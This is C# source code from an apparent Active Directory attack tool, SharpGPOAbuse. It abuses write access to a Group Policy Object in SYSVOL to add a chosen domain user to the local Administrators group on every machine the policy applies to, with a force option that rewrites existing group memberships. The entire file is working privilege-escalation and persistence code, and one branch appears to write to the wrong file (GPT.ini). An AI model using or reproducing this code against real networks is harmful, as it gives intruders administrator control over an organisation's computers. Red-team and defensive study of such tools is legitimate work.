using System;
using System.IO;
using System.DirectoryServices.AccountManagement;

namespace SharpGPOAbuse
{
    public class LocalAdmin
    {
        public static void NewLocalAdmin(string UserAccount, string Domain, string DomainController, string GPOName, string DistinguishedName, bool Force)
        {
            // Get SID of user who will be local admin
            PrincipalContext principalContext = new PrincipalContext(ContextType.Domain, DomainController);
            UserPrincipal userPrincipal = null;
            try
            {
                userPrincipal = UserPrincipal.FindByIdentity(principalContext, IdentityType.SamAccountName, UserAccount);
                Console.WriteLine($"[+] SID Value of {UserAccount} = {userPrincipal.Sid.Value}");
            }
            catch
            {
                Console.Error.WriteLine($"[-] Could not find user {UserAccount} in the {Domain} domain.");
            }

            string GPOGuid = GroupPolicy.GetGPOGUID(DomainController, GPOName, DistinguishedName);

            string template = @"[Unicode]
Unicode=yes
[Version]
signature=""$CHICAGO$""
Revision=1";

            string[] newLocalAdmin = { "[Group Membership]", "*S-1-5-32-544__Memberof =", "*S-1-5-32-544__Members = *" + userPrincipal.Sid.Value };

            string gpoPath = $@"\\{Domain}\\SysVol\\{Domain}\\Policies\\{GPOGuid}";
            string gptPath = gpoPath + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(gpoPath))
            {
                gpoPath += "\\Machine\\Microsoft\\Windows NT\\SecEdit\\";
            }
            else
            {
                Console.WriteLine("[!] Could not find the specified GPO.");
                return;
            }

            // check if the folder structure for adding admin user exists in SYSVOL
            if (!Directory.Exists(gpoPath))
            {
                Directory.CreateDirectory(gpoPath);
            }
            gpoPath += "GptTmpl.inf";
            if (File.Exists(gpoPath))
            {
                bool exists = false;
                Console.WriteLine("[+] File exists: {0}", gpoPath);
                string[] readText = File.ReadAllLines(gpoPath);

                foreach (string s in readText)
                {
                    // Check if memberships are defined via group policy
                    if (s.Contains("[Group Membership]"))
                    {
                        exists = true;
                    }
                }

                // if memberships are defined and force is NOT used
                if (exists && !Force)
                {
                    Console.WriteLine("[!] Group Memberships are already defined in the GPO. Use --force to make changes. This option might break the affected systems!");
                    return;
                }

                // if memberships are defined and force is used
                if (exists && Force)
                {
                    using (StreamWriter file2 = new StreamWriter(gpoPath))
                    {
                        foreach (string l in readText)
                        {
                            if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members="))
                            {
                                if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") > 0))
                                {
                                    file2.WriteLine(l + ", *" + userPrincipal.Sid.Value);
                                }
                                else if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") == 0))
                                {
                                    file2.WriteLine(l + " *" + userPrincipal.Sid.Value);
                                }
                            }
                            else
                            {
                                file2.WriteLine(l);
                            }
                        }
                    }
                    GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, gptPath, "AddLocalAdmin", "Computer");
                    return;
                }

                // if memberships are not defined
                if (!exists)
                {
                    Console.WriteLine("[+] The GPO does not specify any group memberships.");
                    using (StreamWriter file2 = new StreamWriter(gptPath))
                    {
                        foreach (string l in readText)
                        {
                            file2.WriteLine(l);
                        }
                        foreach (string l in newLocalAdmin)
                        {
                            file2.WriteLine(l);
                        }
                    }
                    GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, gptPath, "AddLocalAdmin", "Computer");
                }
            }
            else
            {
                Console.WriteLine("[+] Creating file " + gpoPath);
                string new_text = null;
                foreach (string x in newLocalAdmin)
                {
                    new_text += Environment.NewLine + x;
                }
                File.WriteAllText(gpoPath, template + new_text);
                GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, gptPath, "AddLocalAdmin", "Computer");
            }
        }
    }
}